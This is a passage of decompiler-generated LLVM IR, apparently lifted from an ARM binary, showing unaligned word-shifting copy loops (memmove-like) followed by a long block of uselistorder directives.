  %v8_10790 = inttoptr i32 %v7_10790 to i32*
  %v9_10790 = load i32, i32* @ip, align 4
  store i32 %v9_10790, i32* %v8_10790, align 4
  %v10_10790 = add i32 %v0_10790, -4
  %v11_10790 = inttoptr i32 %v10_10790 to i32*
  %v12_10790 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_10790, i32* %v11_10790, align 4
  store i32 %v1_10790, i32* %r0.global-to-local, align 4
  %v0_10794 = load i32, i32* %r2.global-to-local, align 4
  %v2_10794 = add i32 %v0_10794, -16
  store i32 %v2_10794, i32* %r2.global-to-local, align 4
  %v6_10798 = icmp slt i32 %v0_10794, 16
  br i1 %v6_10798, label %dec_label_pc_1079c, label %dec_label_pc_1076c.dec_label_pc_1076c_crit_edge

dec_label_pc_1076c.dec_label_pc_1076c_crit_edge:  ; preds = %dec_label_pc_1076c
  %v0_1076c.pre = load i32, i32* @r3, align 4
  %v0_10770.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1076c

dec_label_pc_1079c:                               ; preds = %dec_label_pc_1076c
  %v2_1079c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1079c, i32* @r4, align 4
  %v5_1079c = load i8*, i8** %stack_var_-8, align 4
  %v6_1079c = ptrtoint i8* %v5_1079c to i32
  store i32 %v6_1079c, i32* @r5, align 4
  store i32 %v11_10768, i32* @lr, align 4
  %v2_107a0 = add i32 %v0_10794, -4
  store i32 %v2_107a0, i32* %r2.global-to-local, align 4
  %v4_107a0 = add i32 %v0_10794, 2147483632
  %v5_107a0 = and i32 %v2_107a0, %v4_107a0
  %v6_107a0 = icmp slt i32 %v5_107a0, 0
  store i1 %v6_107a0, i1* %cpsr_v.global-to-local, align 1
  %v7_107a0 = icmp slt i32 %v2_107a0, 0
  store i1 %v7_107a0, i1* %cpsr_n.global-to-local, align 1
  %v8_107a0 = icmp eq i32 %v2_107a0, 0
  store i1 %v8_107a0, i1* %cpsr_z.global-to-local, align 1
  %v5_107a4 = icmp slt i32 %v2_10794, -12
  br i1 %v5_107a4, label %dec_label_pc_107c0, label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %dec_label_pc_1079c, %dec_label_pc_1075c, %dec_label_pc_107a8
  %v1_107b4 = phi i32 [ %v5_107b4, %dec_label_pc_107a8 ], [ %v1_10790, %dec_label_pc_1079c ], [ %v0_1079019, %dec_label_pc_1075c ]
  %v0_107a8 = load i32, i32* @r3, align 4
  %v3_107a8 = mul i32 %v0_107a8, 256
  store i32 %v3_107a8, i32* %ip.global-to-local, align 4
  %v0_107ac = load i32, i32* %r1.global-to-local, align 4
  %v1_107ac = add i32 %v0_107ac, -4
  %v2_107ac = inttoptr i32 %v1_107ac to i32*
  %v3_107ac = load i32, i32* %v2_107ac, align 4
  store i32 %v3_107ac, i32* @r3, align 4
  store i32 %v1_107ac, i32* %r1.global-to-local, align 4
  %v4_107b0 = udiv i32 %v3_107ac, 16777216
  %v5_107b0 = or i32 %v4_107b0, %v3_107a8
  store i32 %v5_107b0, i32* @ip, align 4
  %v2_107b4 = add i32 %v1_107b4, -4
  %v3_107b4 = inttoptr i32 %v2_107b4 to i32*
  store i32 %v5_107b0, i32* %v3_107b4, align 4
  %v4_107b4 = load i32, i32* %r0.global-to-local, align 4
  %v5_107b4 = add i32 %v4_107b4, -4
  store i32 %v5_107b4, i32* %r0.global-to-local, align 4
  %v0_107b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_107b8 = add i32 %v0_107b8, -4
  store i32 %v2_107b8, i32* %r2.global-to-local, align 4
  %v6_107bc = icmp slt i32 %v0_107b8, 4
  br i1 %v6_107bc, label %dec_label_pc_107c0.loopexit, label %dec_label_pc_107a8

dec_label_pc_107c0.loopexit:                      ; preds = %dec_label_pc_107a8
  %v4_107b8 = sub i32 3, %v0_107b8
  %v5_107b8 = and i32 %v4_107b8, %v0_107b8
  %v6_107b8 = icmp slt i32 %v5_107b8, 0
  %v7_107b8 = icmp slt i32 %v2_107b8, 0
  store i1 %v6_107b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_107b8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_107c0

dec_label_pc_107c0:                               ; preds = %dec_label_pc_107c0.loopexit, %dec_label_pc_1079c
  %v2_1070451 = phi i32 [ %v5_107b4, %dec_label_pc_107c0.loopexit ], [ %v1_10790, %dec_label_pc_1079c ]
  %v0_106f447 = phi i32 [ %v2_107b8, %dec_label_pc_107c0.loopexit ], [ %v2_107a0, %dec_label_pc_1079c ]
  %v0_107c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_107c0 = add i32 %v0_107c0, 3
  store i32 %v1_107c0, i32* @r1, align 4
  br label %bb151

dec_label_pc_107c8:                               ; preds = %dec_label_pc_10758
  br i1 %v5_10838, label %dec_label_pc_10814, label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %dec_label_pc_107c8
  store i32 %v2_10834, i32* %r2.global-to-local, align 4
  %v3_107d4 = load i32, i32* @r4, align 4
  store i32 %v3_107d4, i32* %stack_var_-12, align 4
  %v6_107d4 = load i32, i32* @r5, align 4
  %v8_107d4 = inttoptr i32 %v6_107d4 to i8*
  store i8* %v8_107d4, i8** %stack_var_-8, align 4
  %v11_107d4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_107d8

dec_label_pc_107d8:                               ; preds = %dec_label_pc_107d8.dec_label_pc_107d8_crit_edge, %dec_label_pc_107d0
  %v0_107fc = phi i32 [ %v1_107fc, %dec_label_pc_107d8.dec_label_pc_107d8_crit_edge ], [ %v0_1079019, %dec_label_pc_107d0 ]
  %v0_107dc = phi i32 [ %v0_107dc.pre, %dec_label_pc_107d8.dec_label_pc_107d8_crit_edge ], [ %v1_10748, %dec_label_pc_107d0 ]
  %v0_107d8 = phi i32 [ %v0_107d8.pre, %dec_label_pc_107d8.dec_label_pc_107d8_crit_edge ], [ %v2_1074c, %dec_label_pc_107d0 ]
  %v3_107d8 = mul i32 %v0_107d8, 65536
  store i32 %v3_107d8, i32* %lr.global-to-local, align 4
  %v1_107dc = add i32 %v0_107dc, -4
  %v2_107dc = inttoptr i32 %v1_107dc to i32*
  %v3_107dc = load i32, i32* %v2_107dc, align 4
  store i32 %v3_107dc, i32* @r3, align 4
  %v4_107dc = add i32 %v0_107dc, -8
  %v5_107dc = inttoptr i32 %v4_107dc to i32*
  %v6_107dc = load i32, i32* %v5_107dc, align 4
  store i32 %v6_107dc, i32* %r4.global-to-local, align 4
  %v7_107dc = add i32 %v0_107dc, -12
  %v8_107dc = inttoptr i32 %v7_107dc to i32*
  %v9_107dc = load i32, i32* %v8_107dc, align 4
  store i32 %v9_107dc, i32* %r5.global-to-local, align 4
  %v10_107dc = add i32 %v0_107dc, -16
  %v11_107dc = inttoptr i32 %v10_107dc to i32*
  %v12_107dc = load i32, i32* %v11_107dc, align 4
  store i32 %v10_107dc, i32* %r1.global-to-local, align 4
  %v4_107e0 = udiv i32 %v12_107dc, 65536
  %v5_107e0 = or i32 %v4_107e0, %v3_107d8
  store i32 %v5_107e0, i32* %lr.global-to-local, align 4
  %v3_107e4 = mul i32 %v12_107dc, 65536
  %v4_107e8 = udiv i32 %v9_107dc, 65536
  %v5_107e8 = or i32 %v3_107e4, %v4_107e8
  store i32 %v5_107e8, i32* @ip, align 4
  %v3_107ec = mul i32 %v9_107dc, 65536
  %v4_107f0 = udiv i32 %v6_107dc, 65536
  %v5_107f0 = or i32 %v3_107ec, %v4_107f0
  store i32 %v5_107f0, i32* %r5.global-to-local, align 4
  %v3_107f4 = mul i32 %v6_107dc, 65536
  %v4_107f8 = udiv i32 %v3_107dc, 65536
  %v5_107f8 = or i32 %v3_107f4, %v4_107f8
  store i32 %v5_107f8, i32* %r4.global-to-local, align 4
  %v1_107fc = add i32 %v0_107fc, -16
  %v2_107fc = inttoptr i32 %v1_107fc to i32*
  store i32 %v5_107f8, i32* %v2_107fc, align 4
  %v4_107fc = add i32 %v0_107fc, -12
  %v5_107fc = inttoptr i32 %v4_107fc to i32*
  %v6_107fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_107fc, i32* %v5_107fc, align 4
  %v7_107fc = add i32 %v0_107fc, -8
  %v8_107fc = inttoptr i32 %v7_107fc to i32*
  %v9_107fc = load i32, i32* @ip, align 4
  store i32 %v9_107fc, i32* %v8_107fc, align 4
  %v10_107fc = add i32 %v0_107fc, -4
  %v11_107fc = inttoptr i32 %v10_107fc to i32*
  %v12_107fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_107fc, i32* %v11_107fc, align 4
  store i32 %v1_107fc, i32* %r0.global-to-local, align 4
  %v0_10800 = load i32, i32* %r2.global-to-local, align 4
  %v2_10800 = add i32 %v0_10800, -16
  store i32 %v2_10800, i32* %r2.global-to-local, align 4
  %v6_10804 = icmp slt i32 %v0_10800, 16
  br i1 %v6_10804, label %dec_label_pc_10808, label %dec_label_pc_107d8.dec_label_pc_107d8_crit_edge

dec_label_pc_107d8.dec_label_pc_107d8_crit_edge:  ; preds = %dec_label_pc_107d8
  %v0_107d8.pre = load i32, i32* @r3, align 4
  %v0_107dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_107d8

dec_label_pc_10808:                               ; preds = %dec_label_pc_107d8
  %v2_10808 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10808, i32* @r4, align 4
  %v5_10808 = load i8*, i8** %stack_var_-8, align 4
  %v6_10808 = ptrtoint i8* %v5_10808 to i32
  store i32 %v6_10808, i32* @r5, align 4
  store i32 %v11_107d4, i32* @lr, align 4
  %v2_1080c = add i32 %v0_10800, -4
  store i32 %v2_1080c, i32* %r2.global-to-local, align 4
  %v4_1080c = add i32 %v0_10800, 2147483632
  %v5_1080c = and i32 %v2_1080c, %v4_1080c
  %v6_1080c = icmp slt i32 %v5_1080c, 0
  store i1 %v6_1080c, i1* %cpsr_v.global-to-local, align 1
  %v7_1080c = icmp slt i32 %v2_1080c, 0
  store i1 %v7_1080c, i1* %cpsr_n.global-to-local, align 1
  %v8_1080c = icmp eq i32 %v2_1080c, 0
  store i1 %v8_1080c, i1* %cpsr_z.global-to-local, align 1
  %v5_10810 = icmp slt i32 %v2_10800, -12
  br i1 %v5_10810, label %dec_label_pc_1082c, label %dec_label_pc_10814

dec_label_pc_10814:                               ; preds = %dec_label_pc_10808, %dec_label_pc_107c8, %dec_label_pc_10814
  %v1_10820 = phi i32 [ %v5_10820, %dec_label_pc_10814 ], [ %v1_107fc, %dec_label_pc_10808 ], [ %v0_1079019, %dec_label_pc_107c8 ]
  %v0_10814 = load i32, i32* @r3, align 4
  %v3_10814 = mul i32 %v0_10814, 65536
  store i32 %v3_10814, i32* %ip.global-to-local, align 4
  %v0_10818 = load i32, i32* %r1.global-to-local, align 4
  %v1_10818 = add i32 %v0_10818, -4
  %v2_10818 = inttoptr i32 %v1_10818 to i32*
  %v3_10818 = load i32, i32* %v2_10818, align 4
  store i32 %v3_10818, i32* @r3, align 4
  store i32 %v1_10818, i32* %r1.global-to-local, align 4
  %v4_1081c = udiv i32 %v3_10818, 65536
  %v5_1081c = or i32 %v4_1081c, %v3_10814
  store i32 %v5_1081c, i32* @ip, align 4
  %v2_10820 = add i32 %v1_10820, -4
  %v3_10820 = inttoptr i32 %v2_10820 to i32*
  store i32 %v5_1081c, i32* %v3_10820, align 4
  %v4_10820 = load i32, i32* %r0.global-to-local, align 4
  %v5_10820 = add i32 %v4_10820, -4
  store i32 %v5_10820, i32* %r0.global-to-local, align 4
  %v0_10824 = load i32, i32* %r2.global-to-local, align 4
  %v2_10824 = add i32 %v0_10824, -4
  store i32 %v2_10824, i32* %r2.global-to-local, align 4
  %v6_10828 = icmp slt i32 %v0_10824, 4
  br i1 %v6_10828, label %dec_label_pc_1082c.loopexit, label %dec_label_pc_10814

dec_label_pc_1082c.loopexit:                      ; preds = %dec_label_pc_10814
  %v4_10824 = sub i32 3, %v0_10824
  %v5_10824 = and i32 %v4_10824, %v0_10824
  %v6_10824 = icmp slt i32 %v5_10824, 0
  %v7_10824 = icmp slt i32 %v2_10824, 0
  store i1 %v6_10824, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_10824, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1082c

dec_label_pc_1082c:                               ; preds = %dec_label_pc_1082c.loopexit, %dec_label_pc_10808
  %v2_1070452 = phi i32 [ %v5_10820, %dec_label_pc_1082c.loopexit ], [ %v1_107fc, %dec_label_pc_10808 ]
  %v0_106f448 = phi i32 [ %v2_10824, %dec_label_pc_1082c.loopexit ], [ %v2_1080c, %dec_label_pc_10808 ]
  %v0_1082c = load i32, i32* %r1.global-to-local, align 4
  %v1_1082c = add i32 %v0_1082c, 2
  store i32 %v1_1082c, i32* @r1, align 4
  br label %bb151

dec_label_pc_10834:                               ; preds = %dec_label_pc_10748
  br i1 %v5_10838, label %dec_label_pc_10880, label %dec_label_pc_1083c

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10834
  store i32 %v2_10834, i32* %r2.global-to-local, align 4
  %v3_10840 = load i32, i32* @r4, align 4
  store i32 %v3_10840, i32* %stack_var_-12, align 4
  %v6_10840 = load i32, i32* @r5, align 4
  %v8_10840 = inttoptr i32 %v6_10840 to i8*
  store i8* %v8_10840, i8** %stack_var_-8, align 4
  %v11_10840 = load i32, i32* @lr, align 4
  br label %dec_label_pc_10844

dec_label_pc_10844:                               ; preds = %dec_label_pc_10844.dec_label_pc_10844_crit_edge, %dec_label_pc_1083c
  %v0_10868 = phi i32 [ %v1_10868, %dec_label_pc_10844.dec_label_pc_10844_crit_edge ], [ %v0_1079019, %dec_label_pc_1083c ]
  %v0_10848 = phi i32 [ %v0_10848.pre, %dec_label_pc_10844.dec_label_pc_10844_crit_edge ], [ %v1_10748, %dec_label_pc_1083c ]
  %v0_10844 = phi i32 [ %v0_10844.pre, %dec_label_pc_10844.dec_label_pc_10844_crit_edge ], [ %v2_1074c, %dec_label_pc_1083c ]
  %v3_10844 = mul i32 %v0_10844, 16777216
  store i32 %v3_10844, i32* %lr.global-to-local, align 4
  %v1_10848 = add i32 %v0_10848, -4
  %v2_10848 = inttoptr i32 %v1_10848 to i32*
  %v3_10848 = load i32, i32* %v2_10848, align 4
  store i32 %v3_10848, i32* @r3, align 4
  %v4_10848 = add i32 %v0_10848, -8
  %v5_10848 = inttoptr i32 %v4_10848 to i32*
  %v6_10848 = load i32, i32* %v5_10848, align 4
  store i32 %v6_10848, i32* %r4.global-to-local, align 4
  %v7_10848 = add i32 %v0_10848, -12
  %v8_10848 = inttoptr i32 %v7_10848 to i32*
  %v9_10848 = load i32, i32* %v8_10848, align 4
  store i32 %v9_10848, i32* %r5.global-to-local, align 4
  %v10_10848 = add i32 %v0_10848, -16
  %v11_10848 = inttoptr i32 %v10_10848 to i32*
  %v12_10848 = load i32, i32* %v11_10848, align 4
  store i32 %v10_10848, i32* %r1.global-to-local, align 4
  %v4_1084c = udiv i32 %v12_10848, 256
  %v5_1084c = or i32 %v4_1084c, %v3_10844
  store i32 %v5_1084c, i32* %lr.global-to-local, align 4
  %v3_10850 = mul i32 %v12_10848, 16777216
  %v4_10854 = udiv i32 %v9_10848, 256
  %v5_10854 = or i32 %v3_10850, %v4_10854
  store i32 %v5_10854, i32* @ip, align 4
  %v3_10858 = mul i32 %v9_10848, 16777216
  %v4_1085c = udiv i32 %v6_10848, 256
  %v5_1085c = or i32 %v3_10858, %v4_1085c
  store i32 %v5_1085c, i32* %r5.global-to-local, align 4
  %v3_10860 = mul i32 %v6_10848, 16777216
  %v4_10864 = udiv i32 %v3_10848, 256
  %v5_10864 = or i32 %v3_10860, %v4_10864
  store i32 %v5_10864, i32* %r4.global-to-local, align 4
  %v1_10868 = add i32 %v0_10868, -16
  %v2_10868 = inttoptr i32 %v1_10868 to i32*
  store i32 %v5_10864, i32* %v2_10868, align 4
  %v4_10868 = add i32 %v0_10868, -12
  %v5_10868 = inttoptr i32 %v4_10868 to i32*
  %v6_10868 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_10868, i32* %v5_10868, align 4
  %v7_10868 = add i32 %v0_10868, -8
  %v8_10868 = inttoptr i32 %v7_10868 to i32*
  %v9_10868 = load i32, i32* @ip, align 4
  store i32 %v9_10868, i32* %v8_10868, align 4
  %v10_10868 = add i32 %v0_10868, -4
  %v11_10868 = inttoptr i32 %v10_10868 to i32*
  %v12_10868 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_10868, i32* %v11_10868, align 4
  store i32 %v1_10868, i32* %r0.global-to-local, align 4
  %v0_1086c = load i32, i32* %r2.global-to-local, align 4
  %v2_1086c = add i32 %v0_1086c, -16
  store i32 %v2_1086c, i32* %r2.global-to-local, align 4
  %v6_10870 = icmp slt i32 %v0_1086c, 16
  br i1 %v6_10870, label %dec_label_pc_10874, label %dec_label_pc_10844.dec_label_pc_10844_crit_edge

dec_label_pc_10844.dec_label_pc_10844_crit_edge:  ; preds = %dec_label_pc_10844
  %v0_10844.pre = load i32, i32* @r3, align 4
  %v0_10848.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10844

dec_label_pc_10874:                               ; preds = %dec_label_pc_10844
  %v2_10874 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10874, i32* @r4, align 4
  %v5_10874 = load i8*, i8** %stack_var_-8, align 4
  %v6_10874 = ptrtoint i8* %v5_10874 to i32
  store i32 %v6_10874, i32* @r5, align 4
  store i32 %v11_10840, i32* @lr, align 4
  %v2_10878 = add i32 %v0_1086c, -4
  store i32 %v2_10878, i32* %r2.global-to-local, align 4
  %v4_10878 = add i32 %v0_1086c, 2147483632
  %v5_10878 = and i32 %v2_10878, %v4_10878
  %v6_10878 = icmp slt i32 %v5_10878, 0
  store i1 %v6_10878, i1* %cpsr_v.global-to-local, align 1
  %v7_10878 = icmp slt i32 %v2_10878, 0
  store i1 %v7_10878, i1* %cpsr_n.global-to-local, align 1
  %v8_10878 = icmp eq i32 %v2_10878, 0
  store i1 %v8_10878, i1* %cpsr_z.global-to-local, align 1
  %v5_1087c = icmp slt i32 %v2_1086c, -12
  br i1 %v5_1087c, label %dec_label_pc_10898, label %dec_label_pc_10880

dec_label_pc_10880:                               ; preds = %dec_label_pc_10874, %dec_label_pc_10834, %dec_label_pc_10880
  %v1_1088c = phi i32 [ %v5_1088c, %dec_label_pc_10880 ], [ %v1_10868, %dec_label_pc_10874 ], [ %v0_1079019, %dec_label_pc_10834 ]
  %v0_10880 = load i32, i32* @r3, align 4
  %v3_10880 = mul i32 %v0_10880, 16777216
  store i32 %v3_10880, i32* %ip.global-to-local, align 4
  %v0_10884 = load i32, i32* %r1.global-to-local, align 4
  %v1_10884 = add i32 %v0_10884, -4
  %v2_10884 = inttoptr i32 %v1_10884 to i32*
  %v3_10884 = load i32, i32* %v2_10884, align 4
  store i32 %v3_10884, i32* @r3, align 4
  store i32 %v1_10884, i32* %r1.global-to-local, align 4
  %v4_10888 = udiv i32 %v3_10884, 256
  %v5_10888 = or i32 %v4_10888, %v3_10880
  store i32 %v5_10888, i32* @ip, align 4
  %v2_1088c = add i32 %v1_1088c, -4
  %v3_1088c = inttoptr i32 %v2_1088c to i32*
  store i32 %v5_10888, i32* %v3_1088c, align 4
  %v4_1088c = load i32, i32* %r0.global-to-local, align 4
  %v5_1088c = add i32 %v4_1088c, -4
  store i32 %v5_1088c, i32* %r0.global-to-local, align 4
  %v0_10890 = load i32, i32* %r2.global-to-local, align 4
  %v2_10890 = add i32 %v0_10890, -4
  store i32 %v2_10890, i32* %r2.global-to-local, align 4
  %v6_10894 = icmp slt i32 %v0_10890, 4
  br i1 %v6_10894, label %dec_label_pc_10898.loopexit, label %dec_label_pc_10880

dec_label_pc_10898.loopexit:                      ; preds = %dec_label_pc_10880
  %v4_10890 = sub i32 3, %v0_10890
  %v5_10890 = and i32 %v4_10890, %v0_10890
  %v6_10890 = icmp slt i32 %v5_10890, 0
  %v7_10890 = icmp slt i32 %v2_10890, 0
  store i1 %v6_10890, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_10890, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_10898.loopexit, %dec_label_pc_10874
  %v2_1070453 = phi i32 [ %v5_1088c, %dec_label_pc_10898.loopexit ], [ %v1_10868, %dec_label_pc_10874 ]
  %v0_106f449 = phi i32 [ %v2_10890, %dec_label_pc_10898.loopexit ], [ %v2_10878, %dec_label_pc_10874 ]
  %v0_10898 = load i32, i32* %r1.global-to-local, align 4
  %v1_10898 = add i32 %v0_10898, 1
  store i32 %v1_10898, i32* @r1, align 4
  br label %bb151

; uselistorder directives
  uselistorder i32 %v5_1088c, { 0, 2, 1 }
  uselistorder i32 %v3_10880, { 1, 0 }
  uselistorder i32 %v2_10878, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_10868, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_10848, { 1, 0 }
  uselistorder i32 %v3_10844, { 1, 0 }
  uselistorder i32 %v0_10848, { 3, 2, 1, 0 }
  uselistorder i32 %v0_10868, { 3, 2, 1, 0 }
  uselistorder i32 %v5_10820, { 0, 2, 1 }
  uselistorder i32 %v3_10814, { 1, 0 }
  uselistorder i32 %v2_1080c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_107fc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_107dc, { 1, 0 }
  uselistorder i32 %v3_107d8, { 1, 0 }
  uselistorder i32 %v0_107dc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_107fc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_107b4, { 0, 2, 1 }
  uselistorder i32 %v3_107a8, { 1, 0 }
  uselistorder i32 %v2_107a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_10790, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_10770, { 1, 0 }
  uselistorder i32 %v3_1076c, { 1, 0 }
  uselistorder i32 %v0_10770, { 3, 2, 1, 0 }
  uselistorder i32 %v0_10790, { 3, 2, 1, 0 }
  uselistorder i1 %v5_10838, { 2, 0, 1 }
  uselistorder i32 %v0_10750, { 1, 0 }
  uselistorder i32 %v0_1083c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1079019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_10740, { 2, 1, 0 }
  uselistorder i32 %v0_10740, { 2, 0, 1 }
  uselistorder i32 %v2_10738, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_10738, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10738, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1079020, { 2, 1, 0 }
  uselistorder i32 %v11_10714, { 1, 0 }
  uselistorder i32 %v7_10714, { 1, 0 }
  uselistorder i32 %v1_106f4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_106f4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_106f8, { 1, 0 }
  uselistorder i32 %v7_106ec, { 0, 2, 1 }
  uselistorder i32 %v10_106e8, { 1, 0 }
  uselistorder i32 %v9_106e0, { 1, 0, 2 }
  uselistorder i32 %v6_106dc, { 1, 0 }
  uselistorder i32 %v2_106d4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_106d4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_106e4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_106c8, { 0, 2, 1 }
  uselistorder i32 %v13_106c4, { 1, 0 }
  uselistorder i32 %v4_106c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_106c0, { 2, 0, 1 }
  uselistorder i32 %v6_106c8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_106b8, { 0, 2, 1 }
  uselistorder i32 %v16_106b4, { 1, 0 }
  uselistorder i32 %v4_106b0, { 1, 2, 0 }
  uselistorder i32 %v0_106c0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_106b8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_106a4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_106a0, { 1, 0 }
  uselistorder i32 %v1_1069c, { 1, 0 }
  uselistorder i32 %v10_10698, { 1, 0 }
  uselistorder i32 %v0_10698, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1069c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_10690, { 0, 2, 1 }
  uselistorder i32 %v2_10684, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_10684, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1069c37, { 1, 2, 0 }
  uselistorder i32 %v1_1067c, { 2, 1, 0 }
  uselistorder i32 %v1_10674, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1066c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_10668, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_10664, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_10664, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_10654, { 0, 2, 1 }
  uselistorder i32 %v4_10650, { 1, 0 }
  uselistorder i32 %v3_10644, { 1, 0 }
  uselistorder i32 %v1_1063c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_10630, { 1, 0 }
  uselistorder i32 %v12_1062c, { 0, 2, 1 }
  uselistorder i32 %v8_1060c, { 1, 0, 2 }
  uselistorder i32 %v5_1060c, { 1, 0, 2 }
  uselistorder i32 %v2_1060c, { 1, 0, 2 }
  uselistorder i32 %v0_1060c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1062c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_105e8, { 0, 2, 1 }
  uselistorder i32 %v4_105e4, { 1, 0 }
  uselistorder i32 %v3_105d8, { 1, 0 }
  uselistorder i32 %v1_105d0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_105c4, { 1, 0 }
  uselistorder i32 %v12_105c0, { 0, 2, 1 }
  uselistorder i32 %v8_105a0, { 1, 0, 2 }
  uselistorder i32 %v5_105a0, { 1, 0, 2 }
  uselistorder i32 %v2_105a0, { 1, 0, 2 }
  uselistorder i32 %v0_105a0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_105c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1057c, { 0, 2, 1 }
  uselistorder i32 %v4_10578, { 1, 0 }
  uselistorder i32 %v3_1056c, { 1, 0 }
  uselistorder i32 %v1_10564, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_10558, { 1, 0 }
  uselistorder i32 %v12_10554, { 0, 2, 1 }
  uselistorder i32 %v8_10534, { 1, 0, 2 }
  uselistorder i32 %v5_10534, { 1, 0, 2 }
  uselistorder i32 %v2_10534, { 1, 0, 2 }
  uselistorder i32 %v0_10534, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10554, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_10590, { 0, 2, 1 }
  uselistorder i32 %v1_1058c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_10510, { 2, 0, 1, 3 }
  uselistorder i32 %v2_10510, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10594, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1062c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_10504, { 1, 0 }
  uselistorder i32 %v0_10504, { 3, 1, 0, 2 }
  uselistorder i32 %v2_104fc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_104fc, { 1, 0, 2 }
  uselistorder i32 %v0_104fc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1062c77, { 1, 0 }
  uselistorder i32 %v1_104dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_104e4, { 1, 0 }
  uselistorder i32 %v0_104b8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_104ac, { 1, 2, 0, 3 }
  uselistorder i32 %v5_10498, { 1, 0, 2 }
  uselistorder i32 %v1_10494, { 1, 0 }
  uselistorder i32 %v1_1048c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1048c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10484, { 0, 2, 1 }
  uselistorder i32 %v3_10484, { 3, 0, 1, 2 }
  uselistorder i1 %v0_10484, { 1, 0 }
  uselistorder i1 %v1_10484, { 1, 0 }
  uselistorder i32 %v3_10480, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_10478, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_10464, { 1, 2, 0 }
  uselistorder i32 %v1_1045c, { 0, 2, 1 }
  uselistorder i32 %v12_10458, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1044c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10450, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_10440, { 0, 2, 1 }
  uselistorder i32 %v1_10438, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10438, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_10430, { 1, 0 }
  uselistorder i32 %v1_10428, { 2, 1, 0 }
  uselistorder i32 %v2_10420, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_10420, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1041c, { 1, 0 }
  uselistorder i32 %v2_10410, { 1, 0 }
